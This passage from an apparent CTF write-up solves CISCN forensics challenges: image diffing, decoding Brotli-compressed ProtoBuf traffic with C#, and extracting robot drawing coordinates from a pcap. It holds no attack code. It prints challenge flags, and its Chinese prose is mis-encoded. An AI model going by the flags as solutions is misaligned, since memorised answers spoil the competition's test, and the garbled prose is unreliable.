&#123;:02d&#125;&#123;&#125;.bmp &#123;:02d&#125;&#123;&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i, j, i + <span class="number">1</span>, j))</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">400</span>):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">400</span>):</span><br><span class="line">                <span class="keyword">if</span> image1.getpixel((y, x)) != image2.getpixel((y, x)):</span><br><span class="line">                    image3.putpixel((y, x), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>(image1.getpixel((y, x))) + <span class="string">&quot; diff &quot;</span> + <span class="built_in">str</span>(image2.getpixel((y, x))))</span><br><span class="line">        image3.save(<span class="string">&quot;./pic2/result&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(count))</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">image3.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬æœ€ç»ˆå¯ä»¥å¾—åˆ°ä¸‹å›¾ï¼Œå°†å…¶é¡ºæ—¶é’ˆæ—‹è½¬åå†æ°´å¹³é•œåƒã€‚åŒæ—¶æ ¹æ®æ–‡ä»¶å¤¹ä¸­çš„æ¯ä¸€å¸§çœ‹å‡ºå­—ç¬¦å®Œæˆçš„å…ˆåé¡ºåºã€‚æŒ‰ç…§é¡ºåºå°†å­—ç¬¦æ‹¼åˆå³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621115613757/c451ebfc4b8b9bb7d31e6a5eacdc17587f23e82c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;</span><br></pre></td></tr></table></figure><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>ç­›é€‰æµé‡åŒ…ä¸­çš„ HTTP æµé‡ï¼Œå¯ä»¥å‘ç°ä¸€éƒ¨åˆ†å“åº”ä¸­æœ‰ Brotli çš„å‹ç¼©æµé‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621057373611/5a0f89a90ec5bdde41df3744c976415c82817fbb.png"></p><p>å°†ä¼ è¾“çš„äºŒè¿›åˆ¶æ–‡ä»¶å¯¼å‡ºï¼Œåœ¨ Linux ä¸­é€šè¿‡ <code>yum install brotli</code> å®‰è£… brotli å·¥å…·ï¼Œä½¿ç”¨ <code>brotli --stdout --decompress /root/data/extract.bin</code> æ¥è§£ç å†…å®¹ã€‚åœ¨ <code>/test</code> è·¯ç”±çš„ä¼ è¾“å†…å®¹è§£ç åå¯ä»¥å¾—åˆ°å¦‚ä¸‹ ProtoBuf3 ç»“æ„ã€‚</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">PBResponse</span> </span>&#123;</span><br><span class="line">  <span class="built_in">int32</span> code = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">int64</span> flag_part_convert_to_hex_plz = <span class="number">2</span>;</span><br><span class="line">  <span class="class"><span class="keyword">message</span> <span class="title">data</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> junk_data = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">string</span> flag_part = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">repeated</span> data dataList = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">int32</span> flag_part_plz_convert_to_hex = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">string</span> flag_last_part = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">PBRequest</span> </span>&#123;</span><br><span class="line">  <span class="built_in">string</span> cate_id = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">int32</span> page = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">int32</span> pageSize = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°† <code>/secret</code> ä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶æå–å‡ºæ¥ï¼Œå‡†å¤‡ååºåˆ—åŒ–ã€‚ä½¿ç”¨ protogen ç”Ÿæˆ C# çš„ç»“æ„ç±»ï¼Œå¾—åˆ°ä¸‹åˆ—ä»£ç ã€‚</p><blockquote><p>protogenï¼š<a href="https://protogen.marcgravell.com/">https://protogen.marcgravell.com/</a></p></blockquote><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;auto-generated&gt;</span></span><br><span class="line"><span class="comment">//   This file was generated by a tool; you should avoid making direct changes.</span></span><br><span class="line"><span class="comment">//   Consider using &#x27;partial classes&#x27; to extend these types</span></span><br><span class="line"><span class="comment">//   Input: my.proto</span></span><br><span class="line"><span class="comment">// &lt;/auto-generated&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">region</span> Designer generated code</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> disable CS0612, CS0618, CS1591, CS3021, IDE0079, IDE1006, RCS1036, RCS1057, RCS1085, RCS1192</span></span><br><span class="line">[<span class="meta">global::ProtoBuf.ProtoContract()</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">PBResponse</span> : <span class="title">global</span>::<span class="title">ProtoBuf.IExtensible</span></span><br><span class="line">&#123;</span><br><span class="line">    private global::ProtoBuf.IExtension __pbn__extensionData;</span><br><span class="line">    global::ProtoBuf.IExtension global::ProtoBuf.IExtensible.GetExtensionObject(bool createIfMissing)</span><br><span class="line">        =&gt; global::ProtoBuf.Extensible.GetExtensionObject(ref __pbn__extensionData, createIfMissing);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(1, Name = @<span class="meta-string">&quot;code&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Code &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(2, Name = @<span class="meta-string">&quot;flag_part_convert_to_hex_plz&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">long</span> FlagPartConvertToHexPlz &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(3, Name = @<span class="meta-string">&quot;dataList&quot;</span>)</span>]</span><br><span class="line">    public global::System.Collections.Generic.List&lt;Data&gt; dataLists &#123; get; &#125; = new global::System.Collections.Generic.List&lt;Data&gt;();</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(4, Name = @<span class="meta-string">&quot;flag_part_plz_convert_to_hex&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> FlagPartPlzConvertToHex &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(5, Name = @<span class="meta-string">&quot;flag_last_part&quot;</span>)</span>]</span><br><span class="line">    [<span class="meta">global::System.ComponentModel.DefaultValue(<span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> FlagLastPart &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoContract(Name = @<span class="meta-string">&quot;data&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Data</span> : <span class="title">global</span>::<span class="title">ProtoBuf.IExtensible</span></span><br><span class="line">    &#123;</span><br><span class="line">        private global::ProtoBuf.IExtension __pbn__extensionData;</span><br><span class="line">        global::ProtoBuf.IExtension global::ProtoBuf.IExtensible.GetExtensionObject(bool createIfMissing)</span><br><span class="line">            =&gt; global::ProtoBuf.Extensible.GetExtensionObject(ref __pbn__extensionData, createIfMissing);</span><br><span class="line"></span><br><span class="line">        [<span class="meta">global::ProtoBuf.ProtoMember(2, Name = @<span class="meta-string">&quot;junk_data&quot;</span>)</span>]</span><br><span class="line">        [<span class="meta">global::System.ComponentModel.DefaultValue(<span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> JunkData &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">global::ProtoBuf.ProtoMember(1, Name = @<span class="meta-string">&quot;flag_part&quot;</span>)</span>]</span><br><span class="line">        [<span class="meta">global::System.ComponentModel.DefaultValue(<span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> FlagPart &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">global::ProtoBuf.ProtoContract()</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">PBRequest</span> : <span class="title">global</span>::<span class="title">ProtoBuf.IExtensible</span></span><br><span class="line">&#123;</span><br><span class="line">    private global::ProtoBuf.IExtension __pbn__extensionData;</span><br><span class="line">    global::ProtoBuf.IExtension global::ProtoBuf.IExtensible.GetExtensionObject(bool createIfMissing)</span><br><span class="line">        =&gt; global::ProtoBuf.Extensible.GetExtensionObject(ref __pbn__extensionData, createIfMissing);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(1, Name = @<span class="meta-string">&quot;cate_id&quot;</span>)</span>]</span><br><span class="line">    [<span class="meta">global::System.ComponentModel.DefaultValue(<span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> CateId &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(2, Name = @<span class="meta-string">&quot;page&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Page &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">global::ProtoBuf.ProtoMember(3)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> pageSize &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> restore CS0612, CS0618, CS1591, CS3021, IDE0079, IDE1006, RCS1036, RCS1057, RCS1085, RCS1192</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endregion</span></span></span><br></pre></td></tr></table></figure><p>åŒæ ·å°†å¾—åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶å…ˆ Brotli è§£å‹ï¼Œä½¿ç”¨ <a href="https://github.com/protobuf-net/protobuf-net">protobuf-net</a> åº“ç¼–å†™ä»£ç æ¥ååºåˆ—åŒ–è§£å‹åè·å¾—çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æ ¹æ® ProtoBuf3 ç»“æ„å¯ä»¥å¾—çŸ¥ flag æœ‰å‡ ä¸ªéƒ¨åˆ†ï¼Œä½†æ˜¯ä¸çŸ¥é“é¡ºåºï¼Œè°ƒè¯•ä¹‹åå¯çŸ¥ <code>dataLists</code> ä¸­æœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œå¤§è‡´ä¸Šæ ¹æ® ProtoBuf3 ç»“æ„ä¸­çš„æ•°å­—æ’åºä¹‹åå¯ä»¥å¾—åˆ° flagã€‚ç¼–å†™è„šæœ¬å¦‚ä¸‹æ¥è·å– flagã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">PBResponse response = Serializer.Deserialize&lt;PBResponse&gt;(<span class="keyword">new</span> FileStream(<span class="string">@&quot;F:\extract.txt&quot;</span>, FileMode.Open));</span><br><span class="line">Console.WriteLine(<span class="string">&quot;CISCN&#123;&quot;</span> + Convert.ToString(response.FlagPartConvertToHexPlz, <span class="number">16</span>)</span><br><span class="line">                                           + response.dataLists[<span class="number">0</span>].FlagPart</span><br><span class="line">                                           + response.dataLists[<span class="number">1</span>].FlagPart</span><br><span class="line">                                           + Convert.ToString(response.FlagPartPlzConvertToHex, <span class="number">16</span>)</span><br><span class="line">                                           + response.FlagLastPart</span><br><span class="line">                                           + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;</span><br></pre></td></tr></table></figure><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><blockquote><p>åˆ†æç»™å‡ºçš„æœºå™¨äººä»¿çœŸç¨‹åºå’Œæµé‡åŒ…ï¼Œæå–æœºå™¨äººæ§åˆ¶ç¨‹åºæ§åˆ¶æœºå™¨äººå†™å‡ºçš„å­—ç¬¦ä¸²ï¼Œflagä¸ºâ€CISCN{md5(æœºå™¨äººç»˜åˆ¶çš„å­—ç¬¦ä¸²)}</p></blockquote><p>ä½¿ç”¨ Wireshark åˆ†ææµé‡åŒ…ï¼Œå‘ç° TCP æµä¸­å­˜åœ¨æ•°æ®ä¼ è¾“ã€‚ä½¿ç”¨ <code>tshark.exe -r cap.pcapng -T fields -e data &gt; data.bin</code> å°†æ•°æ®åˆ†ç¦»å‡ºæ¥ã€‚ç»è¿‡åå…­è¿›åˆ¶è§£ç åå¯ä»¥å‘ç°å…¶ä¸­å­˜åœ¨ç€è®¸å¤šç±»ä¼¼äº <code>[27,36,0]</code> çš„æ•°æ®ï¼Œå°†å…¶ä½¿ç”¨æ­£åˆ™åˆ†ç¦»å‡ºæ¥åå¤„ç†æˆæ•°ç»„ã€‚ä½¿ç”¨å¦‚ä¸‹è„šæœ¬ç»˜åˆ¶å›¾ç‰‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">pixelsLocations = [[<span class="number">27</span>, <span class="number">36</span>], [<span class="number">28</span>, <span class="number">35</span>], [<span class="number">29</span>, <span class="number">35</span>], [<span class="number">31</span>, <span class="number">35</span>], [<span class="number">32</span>, <span class="number">35</span>], [<span class="number">33</span>, <span class="number">35</span>], [<span class="number">35</span>, <span class="number">35</span>], [<span class="number">36</span>, <span class="number">35</span>], [<span class="number">37</span>, <span class="number">35</span>], [<span class="number">39</span>, <span class="number">34</span>],</span><br><span class="line">    [<span class="number">40</span>, <span class="number">34</span>], [<span class="number">41</span>, <span class="number">33</span>], [<span class="number">42</span>, <span class="number">32</span>], [<span class="number">43</span>, <span class="number">32</span>], [<span class="number">45</span>, <span class="number">32</span>], [<span class="number">47</span>, <span class="number">31</span>], [<span class="number">48</span>, <span class="number">29</span>], [<span class="number">49</span>, <span class="number">28</span>], [<span class="number">49</span>, <span class="number">27</span>], [<span class="number">50</span>, <span class="number">26</span>],</span><br><span class="line">    [<span class="number">50</span>, <span class="number">25</span>], [<span class="number">51</span>, <span class="number">23</span>], [<span class="number">51</span>, <span class="number">22</span>], [<span class="number">51</span>, <span class="number">21</span>], [<span class="number">52</span>, <span class="number">20</span>], [<span class="number">52</span>, <span class="number">19</span>], [<span class="number">52</span>, <span class="number">18</span>], [<span class="number">52</span>, <span class="number">17</span>], [<span class="number">52</span>, <span class="number">16</span>], [<span class="number">52</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">51</span>, <span class="number">14</span>], [<span class="number">50</span>, <span class="number">14</span>], [<span class="number">49</span>, <span class="number">14</span>], [<span class="number">48</span>, <span class="number">14</span>], [<span class="number">47</span>, <span class="number">14</span>], [<span class="number">46</span>, <span class="number">14</span>], [<span class="number">45</span>, <span class="number">14</span>], [<span class="number">44</span>, <span class="number">14</span>], [<span class="number">43</span>, <span class="number">14</span>], [<span class="number">42</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">40</span>, <span class="number">14</span>], [<span class="number">39</span>, <span class="number">14</span>], [<span class="number">37</span>, <span class="number">14</span>], [<span class="number">35</span>, <span class="number">14</span>], [<span class="number">34</span>, <span class="number">14</span>], [<span class="number">32</span>, <span class="number">14</span>], [<span class="number">30</span>, <span class="number">14</span>], [<span class="number">28</span>, <span class="number">14</span>], [<span class="number">27</span>, <span class="number">14</span>], [<span class="number">26</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">25</span>, <span class="number">14</span>], [<span class="number">24</span>, <span class="number">14</span>], [<span class="number">23</span>, <span class="number">14</span>], [<span class="number">22</span>, <span class="number">14</span>], [<span class="number">21</span>, <span class="number">15</span>], [<span class="number">20</span>, <span class="number">16</span>], [<span class="number">19</span>, <span class="number">17</span>], [<span class="number">18</span>, <span class="number">19</span>], [<span class="number">18</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">22</span>],</span><br><span class="line">    [<span class="number">18</span>, <span class="number">23</span>], [<span class="number">18</span>, <span class="number">24</span>], [<span class="number">18</span>, <span class="number">26</span>], [<span class="number">18</span>, <span class="number">27</span>], [<span class="number">18</span>, <span class="number">28</span>], [<span class="number">18</span>, <span class="number">30</span>], [<span class="number">18</span>, <span class="number">32</span>], [<span class="number">18</span>, <span class="number">33</span>], [<span class="number">18</span>, <span class="number">34</span>], [<span class="number">19</span>, <span class="number">37</span>],</span><br><span class="line">    [<span class="number">21</span>, <span class="number">39</span>], [<span class="number">21</span>, <span class="number">40</span>], [<span class="number">22</span>, <span class="number">42</span>], [<span class="number">24</span>, <span class="number">44</span>], [<span class="number">24</span>, <span class="number">45</span>], [<span class="number">26</span>, <span class="number">47</span>], [<span class="number">27</span>, <span class="number">48</span>], [<span class="number">28</span>, <span class="number">49</span>], [<span class="number">29</span>, <span class="number">50</span>], [<span class="number">30</span>, <span class="number">51</span>],</span><br><span class="line">    [<span class="number">31</span>, <span class="number">52</span>], [<span class="number">33</span>, <span class="number">53</span>], [<span class="number">34</span>, <span class="number">53</span>], [<span class="number">35</span>, <span class="number">54</span>], [<span class="number">36</span>, <span class="number">54</span>], [<span class="number">37</span>, <span class="number">54</span>], [<span class="number">38</span>, <span class="number">54</span>], [<span class="number">39</span>, <span class="number">54</span>], [<span class="number">40</span>, <span class="number">54</span>], [<span class="number">41</span>, <span class="number">54</span>],</span><br><span class="line">    [<span class="number">44</span>, <span class="number">54</span>], [<span class="number">46</span>, <span class="number">54</span>], [<span class="number">48</span>, <span class="number">54</span>], [<span class="number">50</span>, <span class="number">54</span>], [<span class="number">52</span>, <span class="number">53</span>], [<span class="number">53</span>, <span class="number">53</span>], [<span class="number">54</span>, <span class="number">52</span>], [<span class="number">55</span>, <span class="number">52</span>], [<span class="number">56</span>, <span class="number">52</span>], [<span class="number">58</span>, <span class="number">51</span>],</span><br><span class="line">    [<span class="number">59</span>, <span class="number">50</span>], [<span class="number">61</span>, <span class="number">49</span>], [<span class="number">62</span>, <span class="number">49</span>], [<span class="number">64</span>, <span class="number">47</span>], [<span class="number">65</span>, <span class="number">47</span>], [<span class="number">67</span>, <span class="number">46</span>], [<span class="number">68</span>, <span class="number">46</span>], [<span class="number">70</span>, <span class="number">45</span>], [<span class="number">71</span>, <span class="number">44</span>], [<span class="number">125</span>, <span class="number">23</span>],</span><br><span class="line">    [<span class="number">125</span>, <span class="number">23</span>], [<span class="number">124</span>, <span class="number">22</span>], [<span class="number">123</span>, <span class="number">22</span>], [<span class="number">121</span>, <span class="number">21</span>], [<span class="number">118</span>, <span class="number">20</span>], [<span class="number">115</span>, <span class="number">19</span>], [<span class="number">113</span>, <span class="number">19</span>], [<span class="number">112</span>, <span class="number">18</span>], [<span class="number">111</span>, <span class="number">18</span>],</span><br><span class="line">    [<span class="number">109</span>, <span class="number">17</span>], [<span class="number">106</span>, <span class="number">16</span>], [<span class="number">104</span>, <span class="number">16</span>], [<span class="number">103</span>, <span class="number">16</span>], [<span class="number">102</span>, <span class="number">15</span>], [<span class="number">101</span>, <span class="number">15</span>], [<span class="number">100</span>, <span class="number">15</span>], [<span class="number">99</span>, <span class="number">15</span>], [<span class="number">98</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">97</span>, <span class="number">15</span>], [<span class="number">96</span>, <span class="number">15</span>], [<span class="number">95</span>, <span class="number">15</span>], [<span class="number">94</span>, <span class="number">15</span>], [<span class="number">93</span>, <span class="number">15</span>], [<span class="number">92</span>, <span class="number">15</span>], [<span class="number">91</span>, <span class="number">15</span>], [<span class="number">89</span>, <span class="number">15</span>], [<span class="number">87</span>, <span class="number">17</span>], [<span class="number">85</span>, <span class="number">18</span>],</span><br><span class="line">    [<span class="number">85</span>, <span class="number">19</span>], [<span class="number">84</span>, <span class="number">21</span>], [<span class="number">83</span>, <span class="number">21</span>], [<span class="number">82</span>, <span class="number">22</span>], [<span class="number">82</span>, <span class="number">23</span>], [<span class="number">81</span>, <span class="number">24</span>], [<span class="number">81</span>, <span class="number">26</span>], [<span class="number">80</span>, <span class="number">28</span>], [<span class="number">80</span>, <span class="number">29</span>], [<span class="number">80</span>, <span class="number">31</span>],</span><br><span class="line">    [<span class="number">80</span>, <span class="number">32</span>], [<span class="number">79</span>, <span class="number">34</span>], [<span class="number">79</span>, <span class="number">35</span>], [<span class="number">79</span>, <span class="number">37</span>], [<span class="number">79</span>, <span class="number">39</span>], [<span class="number">79</span>, <span class="number">41</span>], [<span class="number">79</span>, <span class="number">43</span>], [<span class="number">79</span>, <span class="number">44</span>], [<span class="number">79</span>, <span class="number">46</span>], [<span class="number">79</span>, <span class="number">47</span>],</span><br><span class="line">    [<span class="number">80</span>, <span class="number">48</span>], [<span class="number">81</span>, <span class="number">49</span>], [<span class="number">82</span>, <span class="number">50</span>], [<span class="number">84</span>, <span class="number">50</span>], [<span class="number">87</span>, <span class="number">51</span>], [<span class="number">88</span>, <span class="number">51</span>], [<span class="number">90</span>, <span class="number">51</span>], [<span class="number">91</span>, <span class="number">51</span>], [<span class="number">93</span>, <span class="number">51</span>], [<span class="number">94</span>, <span class="number">51</span>],</span><br><span class="line">    [<span class="number">97</span>, <span class="number">51</span>], [<span class="number">100</span>, <span class="number">50</span>], [<span class="number">101</span>, <span class="number">49</span>], [<span class="number">102</span>, <span class="number">49</span>], [<span class="number">103</span>, <span class="number">48</span>], [<span class="number">105</span>, <span class="number">46</span>], [<span class="number">106</span>, <span class="number">45</span>], [<span class="number">108</span>, <span class="number">43</span>], [<span class="number">109</span>, <span class="number">42</span>],</span><br><span class="line">    [<span class="number">110</span>, <span class="number">41</span>], [<span class="number">111</span>, <span class="number">39</span>], [<span class="number">112</span>, <span class="number">38</span>], [<span class="number">112</span>, <span class="number">36</span>], [<span class="number">113</span>, <span class="number">34</span>], [<span class="number">114</span>, <span class="number">33</span>], [<span class="number">115</span>, <span class="number">32</span>], [<span class="number">115</span>, <span class="number">31</span>], [<span class="number">116</span>, <span class="number">30</span>],</span><br><span class="line">    [<span class="number">117</span>, <span class="number">28</span>], [<span class="number">118</span>, <span class="number">27</span>], [<span class="number">118</span>, <span class="number">28</span>], [<span class="number">117</span>, <span class="number">30</span>], [<span class="number">116</span>, <span class="number">32</span>], [<span class="number">115</span>, <span class="number">34</span>], [<span class="number">115</span>, <span class="number">36</span>], [<span class="number">114</span>, <span class="number">39</span>], [<span class="number">114</span>, <span class="number">41</span>],</span><br><span class="line">    [<span class="number">114</span>, <span class="number">43</span>], [<span class="number">114</span>, <span class="number">45</span>], [<span class="number">114</span>, <span class="number">47</span>], [<span class="number">114</span>, <span class="number">48</span>], [<span class="number">114</span>, <span class="number">50</span>], [<span class="number">114</span>, <span class="number">52</span>], [<span class="number">114</span>, <span class="number">53</span>], [<span class="number">115</span>, <span class="number">54</span>], [<span class="number">116</span>, <span class="number">55</span>],</span><br><span class="line">    [<span class="number">117</span>, <span 